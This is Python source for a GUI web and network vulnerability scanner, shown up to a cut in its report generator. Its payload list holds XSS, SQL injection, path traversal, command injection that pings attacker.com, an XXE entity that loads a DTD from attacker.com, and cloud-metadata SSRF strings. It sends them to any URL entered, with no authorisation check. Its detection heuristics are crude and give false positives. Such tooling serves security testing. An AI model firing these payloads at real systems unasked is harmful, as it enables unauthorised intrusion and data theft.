import os
import requests
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import html
import json
import csv
from datetime import datetime
from threading import Thread, Lock, Event
import socket
import ssl
from bs4 import BeautifulSoup
import subprocess
from PIL import Image, ImageTk
import io
import re
import sys
from typing import List, Dict, Tuple, Optional

BG_COLOR = "#1a1a2e"  # Dark navy background for a cyberpunk vibe
FG_COLOR = "#e0e0e0"  # Light gray text for better contrast
ACCENT_COLOR = "#00d4ff"  # Neon cyan for highlights
WARNING_COLOR = "#ff5555"  # Neon red for alerts
BUTTON_COLOR = "#2d2d4b"  # Slightly lighter navy for buttons
BUTTON_HOVER = "#3e3e6b"  # Hover effect for buttons
HIGHLIGHT_COLOR = "#ffaa00"  # Neon orange for highlights
ENTRY_BG = "#2a2a40"  # Darker entry background
TEXT_BG = "#101020"  # Dark text area background
SELECT_BG = "#00aaff"  # Cyan selection background
FONT_NAME = "Montserrat"  # Modern font (fallback to Segoe UI if unavailable)
HEADER_FONT = (FONT_NAME, 18, "bold")
SUBHEADER_FONT = (FONT_NAME, 12, "bold")
BODY_FONT = (FONT_NAME, 10)

# Enhanced security headers for requests
SECURITY_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecurityScanner/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

try:
    import nmap
    NMAP_ENABLED = True
except ImportError:
    NMAP_ENABLED = False

try:
    import dns.resolver  
    DNS_ENABLED = True
except ImportError:
    DNS_ENABLED = False

try:
    import whois 
    WHOIS_ENABLED = True
except ImportError:
    WHOIS_ENABLED = False

class AdvancedWebScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("VULNERABILITY SCANNER")
        self.root.geometry("1200x850")
        self.root.configure(bg=BG_COLOR)
        self.scanning = Event()
        self.lock = Lock()
        self.vulnerabilities_found = 0
        self.current_phase = ""
        self.session = requests.Session()
        self.session.headers.update(SECURITY_HEADERS)
        
        if NMAP_ENABLED:
            try:
                self.nm = nmap.PortScanner()
            except Exception as e:
                print(f"Nmap initialization error: {e}", file=sys.stderr)
                globals()['NMAP_ENABLED'] = False
                
        self.setup_payloads()
        self.setup_ui()
        self.configure_styles()
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_close(self):
        """Handle window close event"""
        self.stop_scan()
        self.root.destroy()

    def setup_payloads(self):
        """Advanced payload database with contextual variations"""
        self.payloads = {
            "XSS": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
                "\"><script>alert(1)</script>"
            ],
            "SQL Injection": [
                "' OR '1'='1'--",
                "\" OR \"\" = \"\"",
                "' UNION SELECT null,username,password FROM users--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
            ],
            "LFI": [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "%00../../../../etc/passwd",
                "/proc/self/environ",
                "file:///etc/passwd"
            ],
            "RCE": [
                "; ls -la",
                "`id`",
                "| dir",
                "&& ver",
                "$(ping -c 1 attacker.com)"
            ],
            "XXE": [
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe; ]>"
            ],
            "SSRF": [
                "http://localhost/admin",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd"
            ]
        }

    def configure_styles(self):
        """Configure ttk styles for a modern cyberpunk look"""
        style = ttk.Style()
        style.theme_use('clam')

        # General widget styles
        style.configure('.', 
                        background=BG_COLOR, 
                        foreground=FG_COLOR, 
                        font=BODY_FONT,
                        borderwidth=0)

        # Notebook styles
        style.configure('TNotebook', 
                        background=BG_COLOR, 
                        borderwidth=0)
        style.configure('TNotebook.Tab', 
                        background=BUTTON_COLOR, 
                        foreground=FG_COLOR, 
                        padding=[15, 8], 
                        font=SUBHEADER_FONT)
        style.map('TNotebook.Tab', 
                  background=[('selected', BG_COLOR), ('active', BUTTON_HOVER)],
                  foreground=[('selected', ACCENT_COLOR), ('active', ACCENT_COLOR)])

        # Button styles
        style.configure('TButton', 
                        background=BUTTON_COLOR, 
                        foreground=FG_COLOR, 
                        padding=[10, 5], 
                        font=BODY_FONT,
                        borderwidth=0)
        style.map('TButton', 
                  background=[('active', BUTTON_HOVER), ('pressed', BUTTON_COLOR)],
                  foreground=[('active', ACCENT_COLOR), ('pressed', ACCENT_COLOR)])

        # Entry styles
        style.configure('TEntry', 
                        fieldbackground=ENTRY_BG, 
                        foreground=FG_COLOR, 
                        borderwidth=1, 
                        padding=[8, 4])
        style.map('TEntry', 
                  fieldbackground=[('active', ENTRY_BG)],
                  foreground=[('active', FG_COLOR)])

        # LabelFrame styles
        style.configure('TLabelframe', 
                        background=BG_COLOR, 
                        foreground=ACCENT_COLOR)
        style.configure('TLabelframe.Label', 
                        background=BG_COLOR, 
                        foreground=ACCENT_COLOR, 
                        font=SUBHEADER_FONT)

        # Checkbutton styles
        style.configure('TCheckbutton', 
                        background=BG_COLOR, 
                        foreground=FG_COLOR, 
                        font=BODY_FONT)
        style.map('TCheckbutton', 
                  background=[('active', BG_COLOR)],
                  foreground=[('active', ACCENT_COLOR)])

        # Progressbar styles
        style.configure('Horizontal.TProgressbar', 
                        thickness=20, 
                        troughcolor=BG_COLOR, 
                        background=ACCENT_COLOR, 
                        borderwidth=0)

    def setup_ui(self):
        """Create advanced UI with multiple tabs"""
        # Header Frame
        header_frame = tk.Frame(self.root, bg=BG_COLOR)
        header_frame.pack(pady=(15, 10))

        tk.Label(header_frame, 
                 text="VULNERABILITY SCANNER", 
                 font=HEADER_FONT, 
                 bg=BG_COLOR, 
                 fg=ACCENT_COLOR).pack()
        tk.Label(header_frame, 
                 text="Advanced Web Application & Network Vulnerability Assessment", 
                 font=(FONT_NAME, 11), 
                 bg=BG_COLOR, 
                 fg=FG_COLOR).pack()

        # Notebook (Tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=15, pady=10)

        # Create tabs
        self.setup_web_scan_tab()
        self.setup_network_tab()
        self.setup_visualization_tab()
        self.setup_settings_tab()

        # Status Bar
        self.status_frame = tk.Frame(self.root, bg=TEXT_BG)
        self.status_frame.pack(fill='x')

        self.status_label = tk.Label(self.status_frame, 
                                     text="Ready", 
                                     bg=TEXT_BG, 
                                     fg=FG_COLOR, 
                                     anchor='w', 
                                     font=BODY_FONT)
        self.status_label.pack(side='left', padx=15, pady=5)

        self.phase_label = tk.Label(self.status_frame, 
                                    text="", 
                                    bg=TEXT_BG, 
                                    fg=ACCENT_COLOR, 
                                    font=BODY_FONT)
        self.phase_label.pack(side='left', padx=20)

        self.progress = ttk.Progressbar(self.status_frame, 
                                        orient='horizontal', 
                                        mode='determinate')
        self.progress.pack(side='right', padx=15, pady=5, fill='x', expand=True)

    def setup_web_scan_tab(self):
        """Setup the web vulnerability scanning tab"""
        web_tab = ttk.Frame(self.notebook)
        self.notebook.add(web_tab, text="Web Scanner")

        # Target Frame
        target_frame = ttk.LabelFrame(web_tab, text="Target Configuration")
        target_frame.pack(fill='x', padx=15, pady=10)

        tk.Label(target_frame, 
                 text="Target URL:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=0, column=0, padx=10, pady=5)
        self.target_entry = ttk.Entry(target_frame, width=50)
        self.target_entry.grid(row=0, column=1, padx=10, pady=5, sticky='ew')

        # Scan Options
        options_frame = ttk.Frame(web_tab)
        options_frame.pack(fill='x', padx=15, pady=5)

        self.xss_var = tk.BooleanVar(value=True)
        self.sql_var = tk.BooleanVar(value=True)
        self.lfi_var = tk.BooleanVar(value=True)
        self.rce_var = tk.BooleanVar(value=True)
        self.xxe_var = tk.BooleanVar(value=True)

        ttk.Checkbutton(options_frame, text="XSS", variable=self.xss_var).pack(side='left', padx=10)
        ttk.Checkbutton(options_frame, text="SQLi", variable=self.sql_var).pack(side='left', padx=10)
        ttk.Checkbutton(options_frame, text="LFI", variable=self.lfi_var).pack(side='left', padx=10)
        ttk.Checkbutton(options_frame, text="RCE", variable=self.rce_var).pack(side='left', padx=10)
        ttk.Checkbutton(options_frame, text="XXE", variable=self.xxe_var).pack(side='left', padx=10)

        # Scan Controls
        control_frame = ttk.Frame(web_tab)
        control_frame.pack(fill='x', padx=15, pady=5)

        self.start_btn = ttk.Button(control_frame, 
                                    text="Start Full Audit", 
                                    command=self.start_full_audit)
        self.start_btn.pack(side='left', padx=5)

        ttk.Button(control_frame, 
                   text="Stop Scan", 
                   command=self.stop_scan).pack(side='left', padx=5)

        ttk.Button(control_frame, 
                   text="Export Report", 
                   command=self.export_report).pack(side='right', padx=5)

        # Results Display
        results_frame = ttk.LabelFrame(web_tab, text="Scan Results")
        results_frame.pack(fill='both', expand=True, padx=15, pady=10)

        self.results_text = scrolledtext.ScrolledText(
            results_frame, 
            wrap=tk.WORD, 
            bg=TEXT_BG, 
            fg=FG_COLOR, 
            insertbackground=FG_COLOR, 
            selectbackground=SELECT_BG, 
            font=BODY_FONT)
        self.results_text.pack(fill='both', expand=True, padx=5, pady=5)

        # Configure tags for colored output
        self.results_text.tag_config('critical', foreground=WARNING_COLOR)
        self.results_text.tag_config('high', foreground="#ff8888")
        self.results_text.tag_config('medium', foreground="#ffbb88")
        self.results_text.tag_config('low', foreground="#ffee88")
        self.results_text.tag_config('info', foreground=ACCENT_COLOR)
        self.results_text.tag_config('error', foreground=WARNING_COLOR)

    def setup_network_tab(self):
        """Setup network scanning tab"""
        network_tab = ttk.Frame(self.notebook)
        self.notebook.add(network_tab, text="Network Scanner")

        # Network Target Frame
        net_target_frame = ttk.LabelFrame(network_tab, text="Network Target")
        net_target_frame.pack(fill='x', padx=15, pady=10)

        tk.Label(net_target_frame, 
                 text="IP/Hostname:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=0, column=0, padx=10, pady=5)
        self.net_target_entry = ttk.Entry(net_target_frame)
        self.net_target_entry.grid(row=0, column=1, padx=10, pady=5, sticky='ew')

        tk.Label(net_target_frame, 
                 text="Port Range:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=0, column=2, padx=10, pady=5)
        self.port_range_entry = ttk.Entry(net_target_frame)
        self.port_range_entry.insert(0, "1-1024,8080,8443")
        self.port_range_entry.grid(row=0, column=3, padx=10, pady=5)

        # Scan Options
        net_options_frame = ttk.Frame(network_tab)
        net_options_frame.pack(fill='x', padx=15, pady=5)

        self.ping_var = tk.BooleanVar(value=True)
        self.os_var = tk.BooleanVar(value=NMAP_ENABLED)
        self.service_var = tk.BooleanVar(value=NMAP_ENABLED)

        ttk.Checkbutton(net_options_frame, 
                        text="Ping Scan", 
                        variable=self.ping_var).pack(side='left', padx=10)
        ttk.Checkbutton(net_options_frame, 
                        text="OS Detection", 
                        variable=self.os_var, 
                        state='normal' if NMAP_ENABLED else 'disabled').pack(side='left', padx=10)
        ttk.Checkbutton(net_options_frame, 
                        text="Service Detection", 
                        variable=self.service_var,
                        state='normal' if NMAP_ENABLED else 'disabled').pack(side='left', padx=10)

        # Network Scan Controls
        net_control_frame = ttk.Frame(network_tab)
        net_control_frame.pack(fill='x', padx=15, pady=5)

        ttk.Button(net_control_frame, 
                   text="Start Network Scan",
                   command=self.start_network_scan).pack(side='left', padx=5)

        # Network Results
        net_results_frame = ttk.LabelFrame(network_tab, text="Network Results")
        net_results_frame.pack(fill='both', expand=True, padx=15, pady=10)

        self.net_results_text = scrolledtext.ScrolledText(
            net_results_frame, 
            wrap=tk.WORD, 
            bg=TEXT_BG, 
            fg=FG_COLOR, 
            font=BODY_FONT)
        self.net_results_text.pack(fill='both', expand=True, padx=5, pady=5)

        # Configure tags for network results
        self.net_results_text.tag_config('open', foreground="#55ff55")
        self.net_results_text.tag_config('closed', foreground="#ff8888")
        self.net_results_text.tag_config('info', foreground=ACCENT_COLOR)
        self.net_results_text.tag_config('error', foreground=WARNING_COLOR)

    def setup_visualization_tab(self):
        """Setup visualization tab"""
        viz_tab = ttk.Frame(self.notebook)
        self.notebook.add(viz_tab, text="Visualization")

        # Vulnerability Summary
        summary_frame = ttk.LabelFrame(viz_tab, text="Vulnerability Summary")
        summary_frame.pack(fill='x', padx=15, pady=10)

        self.summary_canvas = tk.Canvas(summary_frame, 
                                        bg=TEXT_BG, 
                                        height=150, 
                                        highlightthickness=0)
        self.summary_canvas.pack(fill='x', padx=5, pady=5)

        # Scan Timeline
        timeline_frame = ttk.LabelFrame(viz_tab, text="Scan Timeline")
        timeline_frame.pack(fill='both', expand=True, padx=15, pady=10)

        self.timeline_canvas = tk.Canvas(timeline_frame, 
                                         bg=TEXT_BG, 
                                         highlightthickness=0)
        self.timeline_canvas.pack(fill='both', expand=True, padx=5, pady=5)

        # Placeholder text with updated styling
        self.summary_canvas.create_text(150, 50, 
                                        text="Vulnerability summary will appear here", 
                                        fill=FG_COLOR, 
                                        font=BODY_FONT)
        self.timeline_canvas.create_text(150, 50, 
                                         text="Scan timeline will appear here", 
                                         fill=FG_COLOR, 
                                         font=BODY_FONT)

    def setup_settings_tab(self):
        """Setup settings tab"""
        settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(settings_tab, text="Settings")

        # Request Settings
        req_frame = ttk.LabelFrame(settings_tab, text="Request Settings")
        req_frame.pack(fill='x', padx=15, pady=10)

        tk.Label(req_frame, 
                 text="Timeout (seconds):", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=0, column=0, padx=10, pady=8)
        self.timeout_entry = ttk.Entry(req_frame)
        self.timeout_entry.insert(0, "10")
        self.timeout_entry.grid(row=0, column=1, padx=10, pady=8, sticky='w')

        tk.Label(req_frame, 
                 text="Max Threads:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=1, column=0, padx=10, pady=8)
        self.threads_entry = ttk.Entry(req_frame)
        self.threads_entry.insert(0, "10")
        self.threads_entry.grid(row=1, column=1, padx=10, pady=8, sticky='w')

        # Proxy Settings
        proxy_frame = ttk.LabelFrame(settings_tab, text="Proxy Settings")
        proxy_frame.pack(fill='x', padx=15, pady=10)

        tk.Label(proxy_frame, 
                 text="HTTP Proxy:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=0, column=0, padx=10, pady=8)
        self.http_proxy_entry = ttk.Entry(proxy_frame)
        self.http_proxy_entry.grid(row=0, column=1, padx=10, pady=8, sticky='ew')

        tk.Label(proxy_frame, 
                 text="HTTPS Proxy:", 
                 bg=BG_COLOR, 
                 fg=FG_COLOR, 
                 font=BODY_FONT).grid(row=1, column=0, padx=10, pady=8)
        self.https_proxy_entry = ttk.Entry(proxy_frame)
        self.https_proxy_entry.grid(row=1, column=1, padx=10, pady=8, sticky='ew')

    def start_full_audit(self):
        """Start comprehensive security audit"""
        if self.scanning.is_set():
            return
            
        target = self.target_entry.get().strip()
        if not target:
            self.update_status("Please enter a target URL")
            messagebox.showerror("Error", "Please enter a target URL")
            return
            
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f"http://{target}"
                parsed = urlparse(target)
            
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except ValueError as e:
            self.update_status("Invalid target URL")
            messagebox.showerror("Error", f"Invalid target URL: {e}")
            return
            
        self.scanning.set()
        self.vulnerabilities_found = 0
        self.results_text.delete(1.0, tk.END)
        
        # Update proxy settings from UI
        http_proxy = self.http_proxy_entry.get().strip()
        https_proxy = self.https_proxy_entry.get().strip()
        
        proxies = {}
        if http_proxy:
            proxies['http'] = http_proxy
        if https_proxy:
            proxies['https'] = https_proxy
        
        if proxies:
            self.session.proxies.update(proxies)
        
        Thread(target=self.run_full_audit, args=(target,)).start()

    def run_full_audit(self, target):
        """Execute comprehensive security audit"""
        try:
            self.update_status("Starting full security audit...")
            self.update_phase("Initial Reconnaissance")
            
            # Phase 1: Reconnaissance
            self.log_result("=== RECONNAISSANCE PHASE ===", 'info')
            
            if WHOIS_ENABLED:
                whois_info = self.get_whois(target)
                self.log_result(f"WHOIS Info:\n{whois_info}", 'info')
            
            if DNS_ENABLED:
                dns_info = self.get_dns_info(target)
                self.log_result(f"DNS Records:\n{dns_info}", 'info')
            
            # Phase 2: Web Vulnerability Scanning
            self.update_phase("Web Vulnerability Scanning")
            self.log_result("\n=== WEB VULNERABILITY SCAN ===", 'info')
            
            endpoints = self.generate_endpoints(target)
            
            try:
                timeout = int(self.timeout_entry.get())
                max_workers = int(self.threads_entry.get())
            except ValueError:
                timeout = 10
                max_workers = 10
                
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for endpoint in endpoints:
                    if not self.scanning.is_set():
                        break
                    futures.append(executor.submit(self.test_endpoint, endpoint, timeout))
                
                for future in as_completed(futures):
                    if not self.scanning.is_set():
                        break
                    try:
                        results = future.result()
                        for result in results:
                            self.log_result(result[0], result[1])
                    except Exception as e:
                        self.log_result(f"Error processing endpoint: {str(e)}", 'error')
            
            # Phase 3: Network Scanning
            if NMAP_ENABLED and self.scanning.is_set():
                self.update_phase("Network Scanning")
                self.log_result("\n=== NETWORK SCAN ===", 'info')
                
                host = urlparse(target).netloc.split(':')[0]
                open_ports = self.scan_ports(host, "1-1024,8080,8443")
                self.log_result(f"Open ports found: {open_ports}", 'info')
            
            # Final report
            if self.scanning.is_set():
                self.update_phase("Analysis Complete")
                self.log_result("\n=== SCAN COMPLETE ===", 'info')
                self.log_result(f"Total vulnerabilities found: {self.vulnerabilities_found}", 'info')
                self.update_visualizations()
            
        except Exception as e:
            self.log_result(f"Scan error: {str(e)}", 'error')
        finally:
            self.scanning.clear()
            self.update_status("Scan completed")
            self.update_phase("")

    def test_endpoint(self, url: str, timeout: int = 10) -> List[Tuple[str, str]]:
        """Test a single endpoint for all vulnerabilities"""
        results = []
        
        test_types = []
        if self.xss_var.get():
            test_types.append("XSS")
        if self.sql_var.get():
            test_types.append("SQL Injection")
        if self.lfi_var.get():
            test_types.append("LFI")
        if self.rce_var.get():
            test_types.append("RCE")
        if self.xxe_var.get():
            test_types.append("XXE")
        
        for vuln_type in test_types:
            if not self.scanning.is_set():
                break
                
            for payload in self.payloads[vuln_type]:
                try:
                    test_url = f"{url}?param={quote(payload)}"
                    response = self.session.get(test_url, timeout=timeout)
                    
                    if self.is_vulnerable(response, vuln_type, payload):
                        severity = self.get_severity(vuln_type)
                        result = (f"[{severity}] {vuln_type} found at {url} with payload: {payload}", severity.lower())
                        results.append(result)
                        with self.lock:
                            self.vulnerabilities_found += 1
                            
                    if '<form' in response.text.lower():
                        try:
                            soup = BeautifulSoup(response.text, 'html.parser')
                            forms = soup.find_all('form')
                            for form in forms:
                                form_action = form.get('action', '')
                                form_method = form.get('method', 'get').lower()
                                form_url = urljoin(url, form_action) if form_action else url
                                
                                if form_method == 'post':
                                    inputs = form.find_all('input')
                                    data = {}
                                    for input_tag in inputs:
                                        name = input_tag.get('name')
                                        if name:
                                            data[name] = payload
                                    
                                    response = self.session.post(form_url, data=data, timeout=timeout)
                                    if self.is_vulnerable(response, vuln_type, payload):
                                        severity = self.get_severity(vuln_type)
                                        result = (f"[{severity}] {vuln_type} found via POST at {form_url} with payload: {payload}", severity.lower())
                                        results.append(result)
                                        with self.lock:
                                            self.vulnerabilities_found += 1
                        except Exception as e:
                            self.log_result(f"Error testing form at {url}: {str(e)}", 'error')
                            
                except requests.exceptions.RequestException as e:
                    self.log_result(f"Error testing {url}: {str(e)}", 'error')
                except Exception as e:
                    self.log_result(f"Unexpected error testing {url}: {str(e)}", 'error')
        
        return results

    def is_vulnerable(self, response, vuln_type: str, payload: str) -> bool:
        """Determine if response indicates vulnerability"""
        text = html.unescape(response.text)
        
        if vuln_type == "XSS":
            return (payload in text or 
                    "<script>" in text.lower() or 
                    "javascript:" in text.lower() or
                    "onerror=" in text.lower())
        elif vuln_type == "SQL Injection":
            sql_errors = [
                "SQL syntax", "MySQL", "ORA-", "Microsoft OLE DB",
                "ODBC Driver", "PostgreSQL", "syntax error",
                "unclosed quotation mark", "unterminated quoted string"
            ]
            return any(err.lower() in text.lower() for err in sql_errors)
        elif vuln_type == "LFI":
            lfi_indicators = [
                "root:", "[boot loader]", "mysql:", "daemon:",
                "/bin/bash", "/etc/shadow", "www-data:"
            ]
            return any(indicator in text for indicator in lfi_indicators)
        elif vuln_type == "RCE":
            rce_indicators = [
                "uid=", "Volume in drive", "Microsoft Windows",
                "total", "Directory of", "drwxr-xr-x"
            ]
            return any(indicator in text for indicator in rce_indicators)
        elif vuln_type == "XXE":
            return "/etc/passwd" in text or "root:" in text
        return False

    def get_severity(self, vuln_type: str) -> str:
        """Get severity level for vulnerability type"""
        severities = {
            "XSS": "HIGH",
            "SQL Injection": "CRITICAL",
            "LFI": "HIGH",
            "RCE": "CRITICAL",
            "XXE": "HIGH",
            "SSRF": "HIGH"
        }
        return severities.get(vuln_type, "MEDIUM")

    def start_network_scan(self):
        """Start network port scanning"""
        target = self.net_target_entry.get().strip()
        port_range = self.port_range_entry.get().strip()
        
        if not target:
            messagebox.showerror("Error", "Please enter a target host")
            return
        
        if not port_range:
            port_range = "1-1024,8080,8443"
        
        self.net_results_text.delete(1.0, tk.END)
        self.net_results_text.insert(tk.END, f"Scanning {target} ports {port_range}...\n", 'info')
        
        if NMAP_ENABLED:
            Thread(target=self.run_nmap_scan, args=(target, port_range)).start()
        else:
            Thread(target=self.run_basic_port_scan, args=(target, port_range)).start()

    def run_nmap_scan(self, target: str, port_range: str):
        """Run scan using nmap if available"""
        try:
            arguments = "-Pn" if not self.ping_var.get() else ""
            arguments += " -O" if self.os_var.get() else ""
            arguments += " -sV" if self.service_var.get() else ""
            
            self.nm.scan(hosts=target, ports=port_range, arguments=arguments)
            
            for host in self.nm.all_hosts():
                self.net_results_text.insert(tk.END, f"\nScan results for {host}:\n", 'info')
                
                if 'hostnames' in self.nm[host]:
                    for name in self.nm[host]['hostnames']:
                        self.net_results_text.insert(tk.END, f"Hostname: {name['name']}\n", 'info')
                
                if 'osmatch' in self.nm[host]:
                    self.net_results_text.insert(tk.END, "\nOS Detection:\n", 'info')
                    for os_match in self.nm[host]['osmatch']:
                        self.net_results_text.insert(tk.END, f"- {os_match['name']} (Accuracy: {os_match['accuracy']}%)\n", 'info')
                
                self.net_results_text.insert(tk.END, "\nPorts:\n", 'info')
                for proto in self.nm[host].all_protocols():
                    ports = self.nm[host][proto].keys()
                    for port in sorted(ports):
                        port_info = self.nm[host][proto][port]
                        state = port_info['state']
                        service = port_info.get('name', 'unknown')
                        product = port_info.get('product', '')
                        version = port_info.get('version', '')
                        extrainfo = port_info.get('extrainfo', '')
                        
                        output = f"Port {port}/{proto} {state} ({service}"
                        if product:
                            output += f" - {product}"
                        if version:
                            output += f" {version}"
                        if extrainfo:
                            output += f" [{extrainfo}]"
                        output += ")\n"
                        
                        self.net_results_text.insert(tk.END, output, 'open' if state == 'open' else 'closed')
            
            self.net_results_text.insert(tk.END, "\nScan completed.\n", 'info')
        except Exception as e:
            self.net_results_text.insert(tk.END, f"\nNmap scan error: {str(e)}\n", 'error')
        finally:
            self.net_results_text.see(tk.END)

    def run_basic_port_scan(self, target: str, port_range: str):
        """Fallback basic port scan"""
        try:
            ports = self.parse_port_range(port_range)
            open_count = 0
            
            for port in ports:
                if self.scan_port(target, port):
                    self.net_results_text.insert(tk.END, f"Port {port} is open\n", 'open')
                    open_count += 1
                else:
                    self.net_results_text.insert(tk.END, f"Port {port} is closed\n", 'closed')
            
            self.net_results_text.insert(tk.END, f"\nScan completed. {open_count} ports open.\n", 'info')
        except Exception as e:
            self.net_results_text.insert(tk.END, f"\nScan error: {str(e)}\n", 'error')
        finally:
            self.net_results_text.see(tk.END)

    def scan_port(self, host: str, port: int) -> bool:
        """Check if a port is open"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                return s.connect_ex((host, port)) == 0
        except socket.gaierror:
            self.net_results_text.insert(tk.END, f"Hostname resolution failed for {host}\n", 'error')
            return False
        except Exception:
            return False

    def parse_port_range(self, port_range: str) -> List[int]:
        """Convert port range string to list of ports"""
        ports = []
        for part in port_range.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.extend(range(start, end+1))
            else:
                ports.append(int(part))
        return sorted(set(ports))

    def get_whois(self, domain: str) -> str:
        """Get WHOIS information if available"""
        if not WHOIS_ENABLED:
            return "WHOIS functionality not available (install python-whois)"
        
        try:
            domain = urlparse(domain).netloc or domain.split('//')[-1].split('/')[0]
            w = whois.whois(domain)
            
            info = []
            for key, value in w.items():
                if isinstance(value, list):
                    value = ', '.join(str(v) for v in value)
                info.append(f"{key}: {value}")
            
            return "\n".join(info)
        except Exception as e:
            return f"WHOIS lookup failed: {str(e)}"

    def get_dns_info(self, domain: str) -> str:
        """Get DNS records if available"""
        if not DNS_ENABLED:
            return "DNS functionality not available (install dnspython)"
        
        try:
            domain = urlparse(domain).netloc or domain.split('//')[-1].split('/')[0]
            records = {}
            
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR']
            
            for qtype in record_types:
                try:
                    answers = dns.resolver.resolve(domain, qtype, raise_on_no_answer=False)
                    if answers.rrset:
                        records[qtype] = [str(r) for r in answers]
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    continue
                except dns.resolver.NoNameservers:
                    records[qtype] = ["No nameservers found"]
                except Exception as e:
                    records[qtype] = [f"Error: {str(e)}"]
            
            output = []
            for qtype, values in records.items():
                if values:
                    output.append(f"{qtype}:\n  " + "\n  ".join(values))
            
            return "\n".join(output) if output else "No DNS records found"
        except Exception as e:
            return f"DNS lookup failed: {str(e)}"

    def generate_endpoints(self, base_url: str) -> List[str]:
        """Generate common endpoints to test"""
        parsed = urlparse(base_url)
        base_path = parsed.path if parsed.path else '/'
        
        common_paths = [
            "", "search", "login", "admin", "profile",
            "api", "wp-admin", "wp-login", "config",
            "test", "backup", "upload", "download",
            "console", "phpmyadmin", "dbadmin",
            "register", "reset-password", "logout",
            "cgi-bin", "assets", "static", "images"
        ]
        
        endpoints = []
        for path in common_paths:
            if base_path.endswith('/'):
                full_path = base_path + path
            else:
                full_path = base_path + '/' + path
            
            endpoint = parsed._replace(path=full_path).geturl()
            endpoints.append(endpoint)
        
        return endpoints

    def log_result(self, message: str, tag: Optional[str] = None):
        """Log message to results text widget"""
        self.results_text.insert(tk.END, message + "\n", tag)
        self.results_text.see(tk.END)
        self.root.update_idletasks()

    def update_status(self, message: str):
        """Update status bar"""
        self.status_label.config(text=message)
        self.root.update_idletasks()

    def update_phase(self, phase: str):
        """Update current phase indicator"""
        self.current_phase = phase
        self.phase_label.config(text=phase)
        self.root.update_idletasks()

    def stop_scan(self):
        """Stop current scan"""
        if self.scanning.is_set():
            self.scanning.clear()
            self.update_status("Scan stopping...")
            self.update_phase("Cleaning up")
            self.session.close()
            self.session = requests.Session()
            self.session.headers.update(SECURITY_HEADERS)

    def export_report(self):
        """Export scan results to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[
                ("HTML Report", "*.html"), 
                ("Text File", "*.txt"), 
                ("JSON", "*.json"),
                ("CSV", "*.csv"),
                ("PDF", "*.pdf")
            ],
            title="Save Scan Report"
        )
        
        if not filename:
            return
            
        content = self.results_text.get(1.0, tk.END)
        
        try:
            if filename.endswith(".html"):
                self.generate_html_report(filename, content)
            elif filename.endswith(".json"):
                self.generate_json_report(filename, content)
            elif filename.endswith(".csv"):
                self.generate_csv_report(filename, content)
            else:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                    
            self.log_result(f"Report saved to {filename}", 'info')
        except Exception as e:
            self.log_result(f"Failed to save report: {str(e)}", 'error')

    def generate_html_report(self, filename: str, content: str):
        """Generate professional HTML report"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>Security Scan Report</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: {FG_COLOR}; background-color: {BG_COLOR}; margin: 0; padding: 20px; }}
        .report-header {{ background-color: {TEXT_BG}; color: {ACCENT_COLOR}; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .critical {{ color: {WARNING_COLOR}; font-weight: bold; }}
        .high {{ color: #ff8888; }}
        .medium {{ color: #ffbb88; }}
        .low {{ color: #ffee88; }}
        .info {{ color: {ACCENT_COLOR}; }}
        pre {{ background-color: {TEXT_BG}; padding: 15px; border-radius: 5px; white-space: pre-wrap; color: {FG_COLOR}; }}
        .summary {{ background-color: {TEXT_BG}; padding: 15px; border-left: 4px solid {ACCENT_COLOR}; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <div class="report-header">
        <h1>Security Scan Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Target: {self.target_entry.get()}</p>
    </div>
    
    <div class="summary">
        <h2>Scan Summary</h2>
        <p><strong>Vulnerabilities Found:</strong> {self.vulnerabilities_found}</p>
        <p><strong>Scan Duration:</strong> {self.get_scan_duration()}</p>
    </div>
    
